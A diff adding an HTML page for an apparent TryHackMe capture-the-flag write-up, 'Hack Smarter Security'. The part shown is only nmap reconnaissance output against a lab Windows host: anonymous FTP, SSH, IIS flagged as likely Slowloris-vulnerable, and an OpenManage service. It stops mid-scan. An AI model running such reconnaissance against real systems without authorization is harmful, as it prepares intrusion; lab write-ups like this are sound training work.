@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack Smarter Security | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Hack Smarter Security</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Hack Smarter Security</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<div class="codehilite"><pre><span></span><code><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="n">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">           </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">ftpd</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="n">syst</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">SYST</span><span class="p">:</span><span class="w"> </span><span class="n">Windows_NT</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="n">anon</span><span class="p">:</span><span class="w"> </span><span class="n">Anonymous</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="p">(</span><span class="n">FTP</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="mi">230</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="mi">06</span><span class="o">-</span><span class="mi">28</span><span class="o">-</span><span class="mi">23</span><span class="w">  </span><span class="mi">02</span><span class="p">:</span><span class="mi">58</span><span class="n">PM</span><span class="w">                 </span><span class="mi">3722</span><span class="w"> </span><span class="n">Credit</span><span class="o">-</span><span class="n">Cards</span><span class="o">-</span><span class="n">We</span><span class="o">-</span><span class="n">Pwned</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">|</span><span class="n">_06</span><span class="o">-</span><span class="mi">28</span><span class="o">-</span><span class="mi">23</span><span class="w">  </span><span class="mi">03</span><span class="p">:</span><span class="mi">00</span><span class="n">PM</span><span class="w">              </span><span class="mi">1022126</span><span class="w"> </span><span class="n">stolen</span><span class="o">-</span><span class="n">passport</span><span class="o">.</span><span class="n">png</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">           </span><span class="n">OpenSSH</span><span class="w"> </span><span class="n">for_Windows_7</span><span class="o">.</span><span class="mi">7</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">2048</span><span class="w"> </span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="n">fa</span><span class="p">:</span><span class="n">da</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="n">dd</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="mi">2</span><span class="n">e</span><span class="p">:</span><span class="mi">8</span><span class="n">e</span><span class="p">:</span><span class="n">eb</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="n">d3</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">8</span><span class="n">e</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="n">c</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="n">fc</span><span class="p">:</span><span class="mi">1</span><span class="n">a</span><span class="p">:</span><span class="mi">03</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="n">c4</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="n">e7</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="n">d6</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="n">d9</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">8</span><span class="n">a</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="n">ec</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">4</span><span class="n">a</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">IIS</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">10.0</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">stored</span><span class="o">-</span><span class="n">xss</span><span class="p">:</span><span class="w"> </span><span class="n">Couldn</span><span class="s1">&#39;t find any stored XSS vulnerabilities.</span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">csrf</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="n">Spidering</span><span class="w"> </span><span class="n">limited</span><span class="w"> </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="n">maxdepth</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">maxpagecount</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span><span class="w"> </span><span class="n">withinhost</span><span class="o">=</span><span class="n">hack</span><span class="o">.</span><span class="n">thm</span>
+<span class="o">|</span><span class="w">   </span><span class="n">Found</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">possible</span><span class="w"> </span><span class="n">CSRF</span><span class="w"> </span><span class="n">vulnerabilities</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Path</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hack</span><span class="o">.</span><span class="n">thm</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">contact</span><span class="o">.</span><span class="n">html</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Form</span><span class="w"> </span><span class="n">id</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Form</span><span class="w"> </span><span class="n">action</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">Potentially</span><span class="w"> </span><span class="n">risky</span><span class="w"> </span><span class="n">methods</span><span class="p">:</span><span class="w"> </span><span class="n">TRACE</span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">fileupload</span><span class="o">-</span><span class="n">exploiter</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="w">   </span>
+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Couldn</span><span class="s1">&#39;t find a file-type field.</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">dombased</span><span class="o">-</span><span class="n">xss</span><span class="p">:</span><span class="w"> </span><span class="n">Couldn</span><span class="s1">&#39;t find any DOM based XSS.</span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">slowloris</span><span class="o">-</span><span class="n">check</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="n">VULNERABLE</span><span class="p">:</span>
+<span class="o">|</span><span class="w">   </span><span class="n">Slowloris</span><span class="w"> </span><span class="n">DOS</span><span class="w"> </span><span class="n">attack</span>
+<span class="o">|</span><span class="w">     </span><span class="n">State</span><span class="p">:</span><span class="w"> </span><span class="n">LIKELY</span><span class="w"> </span><span class="n">VULNERABLE</span>
+<span class="o">|</span><span class="w">     </span><span class="n">IDs</span><span class="p">:</span><span class="w">  </span><span class="n">CVE</span><span class="p">:</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2007</span><span class="o">-</span><span class="mi">6750</span>
+<span class="o">|</span><span class="w">       </span><span class="n">Slowloris</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">keep</span><span class="w"> </span><span class="n">many</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">hold</span>
+<span class="o">|</span><span class="w">       </span><span class="n">them</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">long</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">possible</span><span class="o">.</span><span class="w">  </span><span class="n">It</span><span class="w"> </span><span class="n">accomplishes</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">opening</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="n">to</span>
+<span class="o">|</span><span class="w">       </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">sending</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">partial</span><span class="w"> </span><span class="n">request</span><span class="o">.</span><span class="w"> </span><span class="n">By</span><span class="w"> </span><span class="n">doing</span><span class="w"> </span><span class="n">so</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">starves</span>
+<span class="o">|</span><span class="w">       </span><span class="n">the</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">server</span><span class="s1">&#39;s resources causing Denial Of Service.</span>
+<span class="o">|</span><span class="w">       </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Disclosure</span><span class="w"> </span><span class="n">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2009</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">17</span>
+<span class="o">|</span><span class="w">     </span><span class="n">References</span><span class="p">:</span>
+<span class="o">|</span><span class="w">       </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ha</span><span class="o">.</span><span class="n">ckers</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">slowloris</span><span class="o">/</span>
+<span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">cve</span><span class="o">.</span><span class="n">mitre</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">cvename</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2007</span><span class="o">-</span><span class="mi">6750</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">HackSmarterSec</span>
+<span class="mi">1311</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">rxmon</span><span class="err">?</span>
+<span class="o">|</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="n">GetRequest</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span><span class="p">:</span><span class="w"> </span><span class="nb">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">Frame</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span><span class="w"> </span><span class="n">SAMEORIGIN</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span><span class="w"> </span><span class="n">nosniff</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">mode</span><span class="o">=</span><span class="n">block</span>
+<span class="o">|</span><span class="w">     </span><span class="n">vary</span><span class="p">:</span><span class="w"> </span><span class="n">accept</span><span class="o">-</span><span class="n">encoding</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">08</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">45</span><span class="w"> </span><span class="n">GMT</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">html</span><span class="w"> </span><span class="n">PUBLIC</span><span class="w"> </span><span class="s2">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span><span class="w"> </span><span class="s2">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">META</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span><span class="w"> </span><span class="n">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">OpenManage</span><span class="o">&amp;</span><span class="n">trade</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">link</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="w"> </span><span class="n">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="s2">&quot;/oma/css/loginmaster.css&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">style</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="o">&gt;&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/prototype.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/gnavbar.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;/oma/js/Clarity.js&quot;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">&quot;javascript&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">   </span><span class="n">HTTPOptions</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span><span class="p">:</span><span class="w"> </span><span class="nb">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">Frame</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span><span class="w"> </span><span class="n">SAMEORIGIN</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">-</span><span class="n">Options</span><span class="p">:</span><span class="w"> </span><span class="n">nosniff</span>
+<span class="o">|</span><span class="w">     </span><span class="n">X</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">mode</span><span class="o">=</span><span class="n">block</span>
+<span class="o">|</span><span class="w">     </span><span class="n">vary</span><span class="p">:</span><span class="w"> </span><span class="n">accept</span><span class="o">-</span><span class="n">encoding</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Sat</span><span class="p">,</span><span class="w"> </span><span class="mi">08</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="n">GMT</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">html</span><span class="w"> </span><span class="n">PUBLIC</span><span class="w"> </span><span class="s2">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span><span class="w"> </span><span class="s2">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">META</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span><span class="w"> </span><span class="n">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">OpenManage</span><span class="o">&amp;</span><span class="n">trade</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">link</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="w"> </span><span class="n">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="s2">&quot;/oma/css/loginmaster.css&quot;</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="o">&lt;</span><span class="n">style</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="o">&gt;&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
